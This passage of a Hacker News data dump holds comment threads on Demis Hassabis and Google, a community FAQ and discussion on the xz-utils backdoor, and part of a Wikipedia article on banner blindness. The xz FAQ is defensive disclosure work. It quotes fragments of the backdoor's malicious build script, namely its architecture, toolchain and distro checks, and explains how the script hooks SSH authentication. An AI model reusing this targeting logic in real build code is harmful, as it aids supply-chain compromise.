Hassabis? reply gafferongames 10 hours agoprevNo reply zippothrowaway 14 hours agoprevDemis \"Infinite Polygon Engine\" Hassabis? Please. Once a charlatan, always a charlatan. reply montag 12 hours agoparentI don't understand how this warrants the label of \"charlatan.\" reply tom_ 9 hours agorootparentThe theory, as I understand it, is that the much-vaunted game engine was not as good as claimed, and the game was also not actually fun, and the man was deploying his IQ more in the service of drumming up publicity for his project than in actually making a quality product. Whether this is true for Google eep Mind too, who can say. Certainly not me! They seem to pay very well, so this is clearly economically valuable activity. We should not shame Sir Demis for enabling it. reply rhaps0dy 13 hours agoparentprevWhat's an \"Infinite Polygon Engine\"? reply zippothrowaway 12 hours agorootparentIt's an in-joke in the British gaming industry. Hassabis started out working for Pete 'Project Milo' Molyneux and learned how to hype himself very obviously from him (see the Edge article linked above). It's working out well for him but you can see the same breathless self-promotion from him now that we saw 20 years ago. Fair play, it's made him rich, but we're screwed if we think people like him are the solution to anything. reply belter 13 hours agorootparentprevThe Internet never forgets...Pag 44: https://retrocdn.net/images/c/c7/Edge_UK_078.pdf reply ShamelessC 13 hours agorootparentprevSurprisingly hard to find information about this via Google. Seems related to Demis' game company Elixir and their game Republic: The Revolution [0] for which he made some claim that it supported an infinite level of detail/polygons. Just a cursory glance at the information though. Happy to be corrected or have more detail added. [0] https://en.wikipedia.org/wiki/Republic:_The_Revolution reply astrange 8 hours agorootparentThat's not an impossible claim, UE5 Nanite does it. reply ShamelessC 8 hours agorootparentI believe this was in the late 90’s and in any case, they didn’t succeed at implementing the system they hyped so much - which is the real problem. reply sandspar 10 hours agoprevFor what it's worth, Elon Musk recently retweeted a very flattering picture of Hassabis, perhaps throwing his support behind him. reply danjl 14 hours agoprevTerrible writing. Creates drama where it doesn't exist. The author makes statements about \"problems at Google\" and provides anecdotal evidence. Desperately tries to create a \"knight on a white horse\" storyline for no reason. Assumes Google makes its money off of products, when actually it makes money off of ads. So much bad. reply HarHarVeryFunny 11 hours agoparentGoogle has diversified a bit, even if most revenue still comes from ads. About half their revenue comes from search, and the rest mostly from YouTube (10%), cloud (10%) and Android (25%, incl. a major chunk from the Google Play store). Their search revenue is potentially at risk from people using LLMs instead, but no reason they can't integrate ads into Gemini, even if they haven't figured it out yet. Lots of opportunity for AI: selling API access, Gemini subscriptions, product licencing (Apple apparently interested, Android potential too), etc. Definitely a mismanaged company though. reply riku_iki 14 hours agoparentprevNo products -> no ads? reply danjl 14 hours agorootparentNo, search -> ads. It isn't like their ads come from Google Meet or GMail. Their ads come from search. Their search is still best with no challengers of note. reply phillipcarter 14 hours agorootparentGoogle makes money directly from several products. \"Ads\" is also an oversimplified way to describe it. Ads aren't a single revenue stream, they're a category of revenue stream with many different ways to tap in, grow, and evolve. reply rurban 3 hours agorootparentprevTheir search is the worst. Kagi being the best, and duckduckgo.com being the better free alternative And with ChatGPT in the room there's doomsday coming, just the UI is missing. reply loudmax 14 hours agorootparentprevLLMs are absolutely a challenger to Google's search. Google search is the still best option much of the time, but they're far from dominant like they were a year or two ago. There are many situations now where ChatGPT or Claude or Perplexity gives more useful results than Google search. And the LLMs are improving rapidly. Far more rapidly than Google search. Google has tremendous engineering talent and Gemini is extremely powerful. But adapting their business to LLMs requires a level of talent and vision from the management side that we have not seen from Google's executive suite in a long time. I won't count out Google as a company, due to the potential that could be put to use by competent leadership. But I've given up on their current management. I'd be happy to be proven wrong. reply AlpHaAriEtiS 14 hours agorootparentIt's undeniable—LLMs (Large Language Models) are now a formidable challenger to Google's search dominion. While Google Search still holds its ground as the go-to in many scenarios, its dominance isn't as unshakable as it was a couple of years ago. There are now numerous instances where ChatGPT, Claude, or Perplexity provide more relevant results than Google Search. Moreover, these LLMs are evolving at an astonishing pace—far outstripping Google Search in terms of development speed. Google possesses incredible engineering prowess, and the Gemini project has proven to be extremely potent. However, adapting their business model to accommodate LLMs demands a level of vision and capability from their management that we've not witnessed from Google's executive ranks in quite some time. I'm not ready to write Google off entirely because of their potential, but I've grown skeptical of their current leadership. I remain open to being pleasantly surprised, though. PS: My personal experience with the Gemini project has been stellar. It's enabled me to produce high-quality code, underscoring that Google still has much to offer—provided its leadership can effectively leverage its resources. reply what 9 hours agorootparentDid you just ask an LLM to rewrite the previous comment? You don’t say anything that wasn’t there. reply Hasu 13 hours agorootparentprevGmail absolutely has ads. Maps has ads. YouTube has ads. Meet doesn't have ads but does have a paid version. > Their search is still best with no challengers of note. Kagi has better search. It's a paid subscription, and by market share it's fair to say they aren't a \"challenger of note\", but the quality is there. (I pay for Kagi but am otherwise not affiliated.) reply brigadier132 13 hours agorootparentprev> Their search is still best with no challengers of note. Like I've said in other comments, google is not my go-to for search anymore. Perplexity is superior. reply riku_iki 14 hours agorootparentprevGMail plays crucial role of making sure all search users are logged into google account and their searches can be tracked for ads targeting. But also, they have some other inventories: youtube, maps. reply methuselah_in 14 hours agoprevGoogle definitely needs saving. As Android will die and it's the only thing Google did right reply mugivarra69 14 hours agoprevdemis for ceo reply ijijijjij 14 hours agoprevas bad as Google is becoming, does it need saving to survive? reply onlyrealcuzzo 14 hours agoparentAnthropic (which Google owns a large stake in) and Gemini are 2 of the 3 best LLMs (both of which outperform GPT in at least some non-trivial tasks). Is it really that bad? Or is it just en vogue to trash? reply CuriouslyC 14 hours agorootparentGemini is painfully over censored. It is good at some niche tasks and probably the best commercial vision model though. I think people just don't want to spend time evaluating a model if it's mostly not great. reply Jensson 13 hours agorootparentGoogle would fix that really quickly if it became a do or die situation. All they need to do is throw out all the overeager social justice people who wants to ruin the model by censoring it. Wouldn't surprise me if a lot of organizational changes already happened after the last debacle. Currently Google care more about PR with ad customers than market share but if things continue like this that will change really quick. reply rileyphone 14 hours agorootparentprevLLMs aren't nearly as monetizable (now) as search ads. Very possible that search collapses in the near future alongside the open web, and that whole line of revenue destroyed. reply dkasper 14 hours agorootparentprevImo the criticisms are more cultural or philosophical than technical, ie the Gemini image search kerfuffle. Clearly Google and Anthropic have a lot of solid people. reply aneutron 14 hours agorootparentprevMy opinion is quite simpler: GPT got the 1st mover's advantage from a marketing perspective, and until Google, Anthropic or another proposes something VASTLY revolutionary for the layperson, then it's unlikely they'll \"catch up\" (which is only a percetion ofc, perhaps a wrong one at that) reply elorant 14 hours agorootparentprevThe problem isn't who has the best LLM, but how can you monetize a LLM the way you monetize search. Can you apply keyword auctions on LLMs and then have links? Will that work? We don't know, and I haven't read any concrete study on the issue. reply mattlondon 14 hours agorootparentI feel like if anything it will be easier to target ads with LLM queries. The user intent will be so much easier to identify, and it would be trivial to show ads based on it. reply ijijijjij 14 hours agorootparentprevnext [3 more] [flagged] PunchTornado 14 hours agorootparentI find Gemini the best. Paying the 20£ subscription for advanced. It's been almost 2 months since I opened chatGPT, gemini completely replaced it for me and I'm a happy customer. Everyone has their preference and maybe some people like you prefer chatGPT, but the way google makes deals with other companies like apple and samsung, I don't see openai competing in the future. reply ijijijjij 13 hours agorootparent> maybe some people like you prefer chatGPT not sure when I said that... that's news to me > I don't see openai competing in the future. I think you can see it in one of the branches of the possible future. reply Simon_ORourke 14 hours agoprevhttps://en.m.wikipedia.org/wiki/Betteridge%27s_law_of_headli... reply rvz 14 hours agoprev [–] DeepMind was Google's life-line. This man (Hassabis) should be CEO of Google. We have given Sundar enough time and without DeepMind, Google would not have Gemini and he did not put DeepMind to use for a long time until now. Google AI that made 'Bard' is NOT DeepMind. You should be looking at Google DeepMind, which made breakthroughs like AlphaGo, AlphaCode, WaveNet, GraphCast, etc. reply kevinventullo 14 hours agoparent [–] I’m not sure Hassabis’s time would be well spent thinking about, I dunno, how to allocate headcount to the Google Cloud Enterprise Sales team. Or glad-handing with world leaders to convince them that ad tech can self-regulate. reply esafak 13 hours agorootparentI don't think Hassabis is ideal for the job, but this kind of thinking is what caused Google to stumble. Google needs a leader who understands technology and product. Google is not Procter and Gamble; the kind of company a suit can run. reply rvz 13 hours agorootparentprev> I’m not sure Hassabis’s time would be well spent thinking about, I dunno, how to allocate headcount to the Google Cloud Enterprise Sales team. Exactly. There is a CEO of Google Cloud (Thomas Kurian) that should be doing that. That's called \"delegation\". reply kevinventullo 13 hours agorootparentOk, so then evaluating whether Thomas Kurian is doing a good job, discussing and pressure testing the rationale behind his proposed targets and strategies, figuring out how they fit in with the broader company strategy and communicating this vision effectively, having a contingency plan if Thomas Kurian leaves or a better candidate for Cloud CEO appears on the radar. These are just off the top of my head. You seem to believe “Delegation” is a passive act; the reality is Hassabis would end up spending, generously, about 1/10 of the time he is now thinking about things like how to monetize LLM’s. reply VirusNewbie 11 hours agorootparentNo CEO is going to be strong in all areas, and it seems different but incredibly successful CEOs can come from a variety of backgrounds and management styles. >\"Ok, so then evaluating whether Thomas Kurian is doing a good job, discussing and pressure testing the rationale behind his proposed targets and strategies, figuring out how they fit in with the broader company strategy and communicating this vision effectively, having a contingency plan if Thomas Kurian leaves or a better candidate for Cloud CEO appears on the radar.\" You could say the same thing about CEOs who are good at that sort of thing as well: Does Sunadr or Satya understand the technical decisions of going all in on Spanner opposed to NoSql type systems or backing the Go language over Carbon, these are all things that will have huge second order effects 10+ years down the road. reply objektif 14 hours agorootparentprev [–] This exactly. Job of a CEO includes doing lots of donkey work. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Demis Hassabis, DeepMind's founder, is spearheading Google's AI research to maintain competitiveness in the field.",
      "DeepMind's breakthroughs like AlphaGo and AlphaFold have established their AI expertise, but a communication gap with OpenAI posed challenges in generative models.",
      "Hassabis is working on Gemini, a language model to compete with OpenAI's GPT models, alongside developing autonomous agent systems, indicating his commitment to research over potentially becoming Google's CEO."
    ],
    "commentSummary": [
      "The article discusses challenges in implementing tree search algorithms in large language models at Google and emphasizes the significance of training for novelty.",
      "It explores Google's leadership, the pursuit of Artificial General Intelligence (AGI), and worries about corporate influence, along with the potential AI impact on different industries.",
      "The text also highlights the limitations and feasibility of AI technology, perceived failures of Google's CEO, and the role of DeepMind within the company."
    ],
    "points": 128,
    "commentCount": 117,
    "retryCount": 0,
    "time": 1711733720
  },
  {
    "id": 39869068,
    "title": "Uncovering the xz-utils Backdoor: Urgent Security Advisory",
    "originLink": "https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27",
    "originBody": "FAQ on the xz-utils backdoor Background On March 29th, 2024, a backdoor was discovered in xz-utils, a suite of software that gives developers lossless compression. This package is commonly used for compressing release tarballs, software packages, kernel images, and initramfs images. It is very widely distributed, statistically your average Linux or macOS system will have it installed for convenience. This backdoor is very indirect and only shows up when a few known specific criteria are met. Others may be yet discovered! However, this backdoor is at least triggerable by remote unprivileged systems connecting to public SSH ports. This has been seen in the wild where it gets activated by connections - resulting in performance issues, but we do not know yet what is required to bypass authentication (etc) with it. We're reasonably sure the following things need to be true for your system to be vulnerable: You need to be running a distro that uses glibc (for IFUNC) You need to have versions 5.6.0 or 5.6.1 of xz or liblzma installed (xz-utils provides the library liblzma) - likely only true if running a rolling-release distro and updating religiously. We know that the combination of systemd and patched openssh are vulnerable but pending further analysis of the payload, we cannot be certain that other configurations aren't. While not scaremongering, it is important to be clear that at this stage, we got lucky, and there may well be other effects of the infected liblzma. If you're running a publicly accessible sshd, then you are - as a rule of thumb for those not wanting to read the rest here - likely vulnerable. If you aren't, it is unknown for now, but you should update as quickly as possible because investigations are continuing. TL:DR: Using a .deb or .rpm based distro with glibc and xz-5.6.0 or xz-5.6.1: Using systemd on publicly accessible ssh: update RIGHT NOW NOW NOW Otherwise: update RIGHT NOW NOW but prioritize the former Using another type of distribution: With glibc and xz-5.6.0 or xz-5.6.1: update RIGHT NOW, but prioritize the above. If all of these are the case, please update your systems to mitigate this threat. For more information about affected systems and how to update, please see this article or check the xz-utils page on Repology. This is still a new situation. There is a lot we don't know. We don't know if there are more possible exploit paths. We only know about this one path. Please update your systems regardless. Unknown unknowns are safer than known unknowns. This is a living document. Everything in this document is made in good faith of being accurate, but like I just said; we don't know much about what's going on. This is not a fault of sshd, systemd, or glibc, that is just how it was made exploitable. Design This backdoor has several components. At a high level: The release tarballs upstream publishes don't have the same code that GitHub has. This is common in C projects so that downstream consumers don't need to remember how to run autotools and autoconf. The version of build-to-host.m4 in the release tarballs differs wildly from the upstream on GitHub. There are crafted test files in the tests/ folder within the git repository too. These files are in the following commits: tests/files/bad-3-corrupt_lzma2.xz (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1) tests/files/good-large_compressed.lzma (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1) A script called by build-to-host.m4 that unpacks this malicious test data and uses it to modify the build process. IFUNC, a mechanism in glibc that allows for indirect function calls, is used to perform runtime hooking/redirection of OpenSSH's authentication routines. IFUNC is a tool that is normally used for legitimate things, but in this case it is exploited for this attack path. Normally upstream publishes release tarballs that are different than the automatically generated ones in GitHub. In these modified tarballs, a malicious version of build-to-host.m4 is included to execute a script during the build process. This script (at least in versions 5.6.0 and 5.6.1) checks for various conditions like the architecture of the machine. Here is a snippet of the malicious script that gets unpacked by build-to-host.m4 and an explanation of what it does: if ! (echo \"$build\"grep -Eq \"^x86_64\" > /dev/null 2>&1) && (echo \"$build\"grep -Eq \"linux-gnu$\" > /dev/null 2>&1);then If amd64/x86_64 is the target of the build And if the target uses the name linux-gnu (mostly checks for the use of glibc) It also checks for the toolchain being used: if test \"x$GCC\" != 'xyes' > /dev/null 2>&1;then exit 0 fi if test \"x$CC\" != 'xgcc' > /dev/null 2>&1;then exit 0 fi LDv=$LD\" -v\" if ! $LDv 2>&1grep -qs 'GNU ld' > /dev/null 2>&1;then exit 0 And if you are trying to build a Debian or Red Hat package: if test -f \"$srcdir/debian/rules\" || test \"x$RPM_ARCH\" = \"xx86_64\";then This attack thusly seems to be targeted at amd64 systems running glibc using either Debian or Red Hat derived distributions. Other systems may be vulnerable at this time, but we don't know. Payload If those conditions check, the payload is injected into the source tree. We have not analyzed this payload in detail. Here are the main things we know: The payload activates if the running program has the process name /usr/sbin/sshd. Systems that put sshd in /usr/bin or another folder may or may not be vulnerable. It may activate in other scenarios too, possibly even unrelated to ssh. We don't know what the payload is intended to do. We are investigating. Vanilla upstream OpenSSH isn't affected unless one of its dependencies links liblzma. The payload is loaded into sshd indirectly. sshd is often patched to support systemd-notify so that other services can start when sshd is running. liblzma is loaded because it's depended on by other parts of libsystemd. This is not the fault of systemd, this is more unfortunate. The patch that most distributions use is available here: openssh/openssh-portable#375. If this payload is loaded in openssh sshd, the RSA_public_decrypt function will be redirected into a malicious implementation. We have observed that this malicious implementation can be used to bypass authentication. Further research is being done to explain why. People We do not want to speculate on the people behind this project in this document. This is not a productive use of our time, and law enforcement will be able to handle identifying those responsible. They are likely patching their systems too. xz-utils has two maintainers: Lasse Collin (Larhzu) who has maintained xz since the beginning (~2009), and before that, lzma-utils. Jia Tan (JiaT75) who started contributing to xz in the last 2-2.5 years and gained commit access, and then release manager rights, about 1.5 years ago. Lasse regularly has internet breaks and is on one at the moment, started before this all kicked off. We believe CISA may be trying to get in contact with him. Misc notes Please do not use ldd on untrusted binaries [PATCH] ldd: Do not recommend binutils as the safer option Acknowledgements Andres Freund who discovered the issue and reported it to linux-distros and then oss-security. All the hard-working security teams helping to coordinate a response and push out fixes. Xe Iaso who resummarized this page for readability. References https://lwn.net/Articles/967180/ https://www.openwall.com/lists/oss-security/2024/03/29/4",
    "commentLink": "https://news.ycombinator.com/item?id=39869068",
    "commentBody": "FAQ on the xz-utils backdoor (gist.github.com)120 points by jethro_tell 12 hours agohidepastfavorite24 comments pseudo0 11 hours agoMain discussion thread here: https://news.ycombinator.com/item?id=39865810 Backdoor in upstream xz/liblzma leading to SSH server compromise (openwall.com) 1848 points by rkta 5 hours ago654 comments AshamedCaptain 10 hours agoprev> The payload only activates if the running program has the process name /usr/bin/sshd. This means that systems that put sshd in /usr/sbin or another folder are not vulnerable. This further suspects targeting systemd systems due to their usrmerge initiative putting all binaries in /usr/bin. This is highly likely wrong. The hack targets rpm and deb distros and as far as I know _all of them_ put sshd in /usr/sbin. The original oss-security report specifically said arg0 had to be /usr/sbin/sshd and I can reproduce his findings about increased runtime if you do so. This /usr/bin vs /usr/sbin also has nothing do with usrmerge. This type of mistake casts doubt in the rest of analysis. reply redserk 8 hours agoparentThere is no rational reason to justify throwing out the entire analysis over one mistake. reply TillE 12 hours agoprev> The release tarballs upstream publishes don't have the same code that GitHub has. This is common in C projects so that downstream consumers don't need to remember how to run autotools and autoconf. This doesn't seem really vital to the attack, but it's a silly outdated convention. Nobody is manually downloading and compiling tarballs these days, and those who do can figure out how to use autotools. reply jiripospisil 12 hours agoparentReminds of the note at the bottom of Fish releases. It's there because the build system cannot determine the current version for some reason. Hopefully that will go away now that they have switched to a different language / build system. The custom tarball is used by Arch Linux at the very least. https://github.com/fish-shell/fish-shell/releases/tag/3.7.1 https://github.com/fish-shell/fish-shell/issues/7772#issueco... https://gitlab.archlinux.org/archlinux/packaging/packages/fi... reply binary132 9 hours agoparentprevyou mean like LLVM’s source release tars? yeah, who would do that, haha? reply IshKebab 12 hours agoparentprevYeah terrible idea. Either you should commit the output of autoconf (and enforce keeping it up to date via CI), or much much better - stop using autoconf! It belongs in the 90s! reply knorker 12 hours agorootparentIt's another case of that \"yes, it sucks. But the alternatives just plain don't work, or work in WAY fewer circumstances\". If I have a strange architecture or install, autoconf is often the only one that works. reply IshKebab 1 hour agorootparentWhat strange architecture are you talking about? I don't think the cost of supporting dead architectures is worth it. CMake is a clear better choice (it also sucks but it sucks waaaay less). reply k8svet 10 hours agoparentprevYes, and in fact, it's quite a huge pain even in the packaging side. Everytime I have to deal with autotools in nixpkgs, I end up having to rewrite the derivation to build from actual freaking source instead of a pre-mangled non-release tarball. In fact, this makes me want to RFC *banning* release tarball usage. reply choeger 12 hours agoprevSo the attacker put the payload into the tests folder of the compression library and injected it upon build via some arcane build script? Kudos. That's quite a smart way to hide your backdoor. Nevertheless, they got caught. So big respect for the analysis. Amazing work. That being said, what does this attack tell you about the future of software security? Free software could easily be compromised by having a highly paid team create such a payload and then convince some maintainer, one way or another, to deploy it. How do we back off from that cliff? reply jethro_tell 11 hours agoparentTo be fair, so could closed source code. The difference in this case is that a guy was running perf tests against postgres and noticed his ssh was slow, so he dove into that and found the backdoor a couple days after it was pushed. If you had to submit 'my ssh daemon is slow' to a third party it would get put on the pile with the rest of them reply bee_rider 10 hours agorootparentHmm, well they never find these kinds of attacks in closed source code. OTOH they never find these kinds of attacks in closed source code! reply wolverine876 7 hours agorootparentprevClosed source is a little tougher: Often you need to get a job somewhere in their organization or supply chain. reply bashtoni 7 hours agorootparentOr find a security vulnerability in their network, say a poorly secured FTP server as per SolarWinds. reply cassianoleal 11 hours agoparentprevSecurity is hard. In this case, it seems like there's a lot that could be done to reduce the chance of being exploited. Why are obscure binaries in the repository at all in the first place, even if in the test dir? Surely those binaries can be generated as a setup step prior to the tests actually running. Furthermore, why are there scripts present in the release package that have not been added to the source code? Also, if I understood it correctly, the compromised binaries are also present in the release tarball. Why are they part of the release if they are supposedly test fixtures rather than part of the application code? reply cesarb 9 hours agorootparent> Why are they part of the release if they are supposedly test fixtures rather than part of the application code? Test fixtures should be distributed together with the application code, so that the actually built application can be tested. Ideally, the application should be tested every time it's built, to ensure that for instance a change in the compiler being used didn't break it. reply xorcist 9 hours agoprevPeople are prematurely celebrating this did not reach a stable distribution. But we haven't seen the full fallout yet. How many debian-developer's machines have been compromised, for example? reply threeseed 9 hours agoparentI don't think that's the biggest concern. There are 2 years of commits that potentially have backdoors. reply aimonster2 10 hours agoprevSo wait, if I did a find / -n 'liblzma*' and saw 5.4, I'm good? This is only 5.6 and 5.6.1, right? reply xorcist 9 hours agoparentFrom what is publicly known at the moment, yes. Note however that xzutils home page says that \"versions 5.2.12, 5.4.3 and later have been signed with Jia Tan's OpenPGP key\" so there would have been plenty more opportunities. We may just have seen the beginning. Whoever did this played the long game. Also note that there was proposed patches by this compromised project maintainer to oss-fuzz and valgrind to avoid the detection of this backdoor. reply botanical 6 hours agoparentprevThe attacker had 750 previous commits; maybe it was all for this or maybe there are more vulnerabilities. reply pdw 12 hours agoprev [–] Flagged: How is this \"via a project dev\"? Which project? The guy doesn't seem to have anything to do with the discovery of this backdoor, and he just summarizes Andres Freund's announcement. reply bhaney 11 hours agoparent [–] The author of this is a gentoo maintainer who focuses on security work. Most distros have a couple of point people handling this issue for them at this point, and they are all likely pretty well informed. If you want clarification on something, you can just ask instead of announcing that you've flagged it. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A backdoor was found in xz-utils on March 29th, 2024, impacting systems with versions 5.6.0 or 5.6.1 of xz or liblzma, triggered by remote unprivileged systems connecting to public SSH ports.",
      "The exploit uses glibc, systemd, and specific configurations to target OpenSSH's authentication procedures, potentially allowing bypassing of authentication processes.",
      "Maintainers of xz-utils are actively working on patches, emphasizing the urgency for users with publicly accessible SSH to update their systems promptly."
    ],
    "commentSummary": [
      "A backdoor, xz-utils, was found in the xz/liblzma library, risking the compromise of SSH servers when the process name matches /usr/bin/sshd.",
      "The attacker planted the exploit into the compression library's test folder, sparking debates on software security practices in open and closed source settings.",
      "Ongoing talks focus on the implications of past commits and stress the continuous need for vigilant software development and distribution methods to prevent such compromises."
    ],
    "points": 120,
    "commentCount": 24,
    "retryCount": 0,
    "time": 1711746713
  },
  {
    "id": 39867632,
    "title": "Combatting Banner Blindness: Understanding User Behavior and Ad Effectiveness",
    "originLink": "https://en.wikipedia.org/wiki/Banner_blindness",
    "originBody": "Toggle the table of contents Banner blindness 11 languages Español فارسی Français 한국어 עברית Македонски Norsk bokmål Polski Português Русский Українська Edit links Article Talk English Read Edit View history Tools Tools move to sidebar hide Actions Read Edit View history General What links here Related changes Upload file Special pages Permanent link Page information Cite this page Get shortened URL Download QR code Wikidata item Print/export Download as PDF Printable version From Wikipedia, the free encyclopedia The front page of an internet forum with several orange banner messages attempting to catch the user's attention Standard web banner ad sizes circa 2009 Banner blindness is a phenomenon in web usability where visitors to a website consciously or unconsciously ignore banner-like information. A broader term covering all forms of advertising is ad blindness, and the mass of banners that people ignore is called banner noise. The term banner blindness was coined in 1998[1] as a result of website usability tests where a majority of the test subjects either consciously or unconsciously ignored information that was presented in banners. The information that was overlooked included both external advertisement banners and internal navigational banners, often called \"quick links\". This does not, however, mean that banner ads do not influence viewers. Website viewers may not be consciously aware of an ad, but it does have an unconscious influence on their behavior.[2] A banner's content affects both businesses and visitors of the site.[3] Native advertising and social media are used to avoid banner blindness. Factors[edit] Human behavior[edit] User goals[edit] When searching for specific information on a website, users focus only on the parts of the page where they expect that information will be, e.g. small text and hyperlinks.[4] A 2011 study investigated via eye-tracking analysis whether users avoided looking at ads inserted on a non-search website, and whether they retained ad content in memory. The study found that most participants fixated (looked at) ads at least once during their website visit.[5] When a viewer is working on a task, ads may cause a disturbance, eventually leading to ad avoidance. If a user wants to find something on the web page and ads disrupt or delay their search, they will try to avoid the source of interference.[6] Clutter aversion[edit] A higher than expected number of advertisements may cause a user to view the page as cluttered.[7] The number of adverts and annoyances on a webpage contribute to this perception of clutter.[6] As users can concentrate on only one stimulus at a time, having too many objects in their field of vision causes them to lose focus.[8] This contributes to behaviors such as ad avoidance or banner blindness. Website familiarity[edit] As a user becomes familiar with a webpage, they learn where to expect content, and where to expect adverts, and learn to ignore banner ads without looking at them.[6] Usability tests that compared the perception of banners between subjects searching for specific information and subjects aimlessly browsing seem to support this theory.[4] A 2014 eye-tracking study examined how right-side images (in contrast to plain text) in Google AdWords affect users' visual behavior. The analysis concludes that the appearance of images does not change user interaction with ads.[9] Brand recognition[edit] If a user is already aware of a brand, viewing an ad banner for that brand would reconfirm their existing attitudes towards it, whether positive or negative. A banner ad may only leave a positive impression in the viewer if they already have a positive perception of the brand. Similarly, someone seeing an ad for a brand they have a negative perception of may further dissuade them from buying from that brand. If viewers have a neutral or no opinion about a brand, then a banner ad for that brand could leave a positive impression, due to the mere-exposure effect: A tendency to develop a preference for something due to familiarity.[10] Banner aspects[edit] Shared space[edit] Unlike advertisements in television or radio, which completely interrupt and temporarily replace the content, banner adverts exist alongside the content. Websites typically contain various elements in different sizes, shapes, and colours. As a banner ad only occupies part of a website, it cannot hold the user's complete attention.[6] Perceived usefulness[edit] Banner ads that seem to contain useful information, and which are easy for the viewer to comprehend, are more likely to be viewed and clicked on than adverts the user does not find useful, or finds difficult to understand.[11] Prices and promotions, when mentioned in banner ads, do not have a major impact on their perceived usefulness. Users assume that all ads signify promotions of some sort and hence do not give much weight to it.[11] Congruence[edit] Congruity is the relationship of an advert with the surrounding web content. There have been mixed results of congruity on users. Click through rates increased when the ads shown on a website were similar to the products or services of that website. A banner with colour schemes incongruent with the rest of website does grab the viewer's attention, but they tend to respond negatively to it, compared with banners whose color schemes were congruent.[12] Congruency has more impact when the user browses fewer web pages. When users were given specific web tasks in a 2013 study, incongruent ads grabbed their attention, but they displayed ad avoidance behaviors.[13] The relevance of the ad's content to the user's goal and to the website does not affect view time due to the expectation that an advert will be irrelevant.[14] Congruency between the advert and the web content has no effect on view duration, according to a 2011 study.[15] Calls to action[edit] Banners with phrases that invite action, such as \"click here\", do not attract views or clicks.[16] Prevention and Subversion[edit] Advertisers and webmasters may attempt to prevent or subvert banner blindness by eliminating one or more possible causes: Location[edit] Users generally read webpage from top left to bottom right, so adverts in this path may be more noticeable. As viewers are less likely to notice something in their peripheral vision, adverts to the right of the page content will be seen less than adverts to the left. Banner ads just below the navigation area may be viewed more, as users expect content at the top of the page. Confusion about whether the top of page has content or advertisement results in more views of the advert.[16] Animation[edit] Users dislike animated ads since they can cause loss of focus. This distraction may increase the attention of some users when they are involved in free browsing (not seeking to complete a specific goal). Users involved in a specific task typically fail to recall animated ads, take longer to complete their task, and experience an increased perceived workload.[16] Moderate animation can increase recognition rates. Rapidly animated banner ads can cause lower recognition rates of the advert itself, and negative attitudes toward the advertiser.[17] In visual search tasks, animated ads did not impact the performance of users and did not capture more views than static ads.[18] Animations signal to users of the existence of ads and lead to ad avoidance behavior, but repetitive exposure to them can induce the mere exposure effect.[19] Personalization and relevance[edit] Personalized ads use and include information about viewers, like demographics, PII, and purchasing habits. An ad is noticed more if it has a higher degree of personalization, even if it causes discomfort in users. Personalized ads are found to be clicked more often than other ads. If a user is involved in a demanding task, more attention is paid to a personalized ad than an unpersonalised ad.[20][21] Such ads do, however, increase privacy concerns and can appear 'creepy'. An individual with greater existing privacy concerns will avoid personalised ads, primarily due to concerns over their data being shared with third parties. Users are more likely to accept behavior tracking if they have faith in the company that permitted the ad. Though this can be an effective method for advertisers, users do not always prefer their behaviors be used to personalize ads. Ads are more often clicked when they show something relevant to the user's search but if the purchase has been made, and the ad continues to appear, it causes frustration.[20][21] Personalization enhanced recognition for the content of banners while the effect on attention was weaker and less significant, in the studies conducted by Koster et al. Exploration of web pages and recognition of task-relevant information was not influenced. Visual exploration of banners typically proceeds from the picture to the logo and finally to the slogan.[22] If a website serves ads unrelated to its viewers' interests, about 75% of viewers experience frustration with the website.[23] Advertising efforts must focus on the user's current intention and interest and not just previous searches. Publishing fewer, but more relative, ads is more effective. Advertisers may use data analytics and campaign management tools to categorise viewers and serve ads that are more likely to be relevant to the user's interests. Information about users could be gained through gamification tools which could reward them for providing that information. Such tools could be quizzes, calculators, chats, or questionnaires. Native ads[edit] Native advertising often places adverts inline with expected, non-ad content. For example, video advertisements playing within a video-streaming website before, during, or after the main video feature. Another common format is a text or image advert within a social media feed, formatted to resemble posts made by users. Native ads are designed to resemble the user's expected experience. They can have greater viewability than other forms of advertising because they are less easy to distinguish from expected, non-advert content.[24] Social media[edit] Through social media, advertisers can transfer feelings of trust in known individuals to adverts, thereby validating the ads. Peer pressure can encourage users to change attitudes or behavior regarding advertising to adapt to group customs.[25] Advertisement through known people piqued interests of users and increased ad views much more effectively than banner ads. See also[edit] Click-through rate – Percentage of views on a certain web page that made a desired click Conditioning – Aspect of learning procedure Habituation – Decrease in a behavioral response to a repeated stimulus Inattentional blindness – Condition of failing to see something in plain view Information overload – Decision making with too much information Semantic satiation – Psychological phenomenon Topics in human-computer interaction – Overview of and topical guide to human–computer interaction Usability testing – Technique in user-centered interaction design View-through rate – A method of measuring the amount of views an online ad campaign receives Web design – Creation and maintenance of websites References[edit] ^ Benway, J. P.; Lane, D. M. (1998). \"Banner Blindness: Web Searchers Often Miss 'Obvious' Links\" (PDF). Internet Technical Group, Rice University. Retrieved July 15, 2016. ^ Lee, J., & Ahn, J. H. (2012). Attention to banner ads and their effectiveness: An eye-tracking approach. International Journal of Electronic Commerce, 17(1), 119-137. ^ Lapa, C. (2007). Using eye tracking to understand banner blindness and improve website design. ^ a b Pagendarm, M.; Schaumburg, H. (2001). \"Why Are Users Banner-Blind? The Impact of Navigation Style on the Perception of Web Banners\". Journal of Digital Information. 2 (1). ^ Hervet, G.; Guerard, K.; Tremblay, S.; Chtourou, M. S. (2011). \"Is Banner Blindness Genuine? Eye Tracking Internet Text Advertising\". Applied Cognitive Psychology. 25 (5): 708–716. doi:10.1002/acp.1742. ^ a b c d [null Drèze, X., & Hussherr, F. X. (2003). Internet advertising: Is anybody watching?. Journal of interactive marketing, 17(4), 8-23.] ^ Cho, C. H., & as-, U. O. T. A. A. I. A. (2004). Why do people avoid advertising on the internet?. Journal of advertising, 33(4), 89-97. ^ Djamasbi, S., Hall-Phillips, A., & Yang, R. R. (2013). An Examination of Ads and Viewing Behavior: An Eye Tracking Study on Desktop and Mobile Devices. ^ Ortiz-Chaves, L.; et al. (2014). \"AdWords, images, and banner blindness: an eye-tracking study\". El Profesional de la Información. 23 (3): 279–287. 